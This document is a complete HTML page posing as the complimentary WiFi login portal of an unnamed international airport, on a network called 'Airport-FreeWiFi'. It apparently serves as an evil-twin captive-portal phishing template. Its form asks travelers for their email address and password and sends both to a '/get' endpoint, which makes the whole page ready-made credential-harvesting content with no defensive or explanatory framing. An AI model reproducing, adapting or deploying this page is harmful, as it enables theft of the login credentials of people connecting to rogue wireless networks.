<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>International Airport — WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#0a1628;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:430px;background:#0f1e35;border:1px solid #1e3050;border-radius:12px;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,0.5)}
.top{padding:26px 28px 20px;display:flex;align-items:center;gap:16px;border-bottom:1px solid #1e3050}
.plane-wrap{width:46px;height:46px;background:rgba(0,150,255,0.12);border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.plane-wrap svg{width:24px;height:24px;fill:#0096ff}
.top-text .airport{font-size:16px;font-weight:700;color:#e0eaf8;letter-spacing:0.3px}
.top-text .terminal{font-size:11px;color:#3a5070;margin-top:3px;letter-spacing:0.5px}
.status-bar{background:#0d1a2e;padding:8px 28px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #1e3050}
.dot{width:7px;height:7px;background:#4ade80;border-radius:50%;flex-shrink:0;animation:pulse 2s infinite}
@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(74,222,128,0.4)}50%{box-shadow:0 0 0 5px rgba(74,222,128,0)}}
.status-bar span{font-size:11.5px;color:#3a5070;letter-spacing:0.3px}
.status-bar strong{color:#5a8098;font-weight:500}
.body{padding:26px 28px 22px}
.body h2{font-size:18px;font-weight:700;color:#c0d8f0;margin-bottom:4px}
.body .sub{font-size:12.5px;color:#3a5070;margin-bottom:22px}
.lbl{display:block;font-size:10.5px;font-weight:600;text-transform:uppercase;letter-spacing:1.2px;color:#3a5070;margin-bottom:7px;margin-top:18px}
input{width:100%;padding:12px 14px;border:1px solid #1e3050;border-radius:8px;font-size:14.5px;background:#0a1628;color:#c0d8f0}
input:focus{outline:none;border-color:#0096ff;box-shadow:0 0 0 3px rgba(0,150,255,0.1)}
input::placeholder{color:#1e3050}
.btn{width:100%;padding:13px;margin-top:22px;border:none;border-radius:8px;background:#0096ff;color:#fff;font-size:13px;font-weight:700;letter-spacing:0.5px;cursor:pointer}
.terms{font-size:11px;color:#2a4060;text-align:center;margin-top:14px;line-height:1.6}
.terms a{color:#0096ff}
.foot{background:#0d1a2e;border-top:1px solid #1e3050;padding:12px 28px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10.5px;color:#2a4060;text-decoration:none}
.foot a{color:#0096ff}
</style>
</head>
<body>
<div class="card">
  <div class="top">
    <div class="plane-wrap">
      <svg viewBox="0 0 24 24"><path d="M21 16v-2l-8-5V3.5c0-.83-.67-1.5-1.5-1.5S10 2.67 10 3.5V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5l8 2.5z"/></svg>
    </div>
    <div class="top-text">
      <div class="airport">International Airport</div>
      <div class="terminal">Complimentary Passenger WiFi</div>
    </div>
  </div>
  <div class="status-bar"><div class="dot"></div><span>Network: <strong>Airport-FreeWiFi</strong></span></div>
  <div class="body">
    <h2>Connect to Free WiFi</h2>
    <p class="sub">Sign in to access complimentary internet during your visit.</p>
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Connect Now</button>
      <p class="terms">By connecting you agree to the <a href="#">Acceptable Use Policy</a>. Service is complimentary for all travelers.</p>
    </form>
  </div>
  <div class="foot"><span>Airport WiFi Services</span><a href="#">Help &amp; Support</a></div>
</div>
</body>
</html>
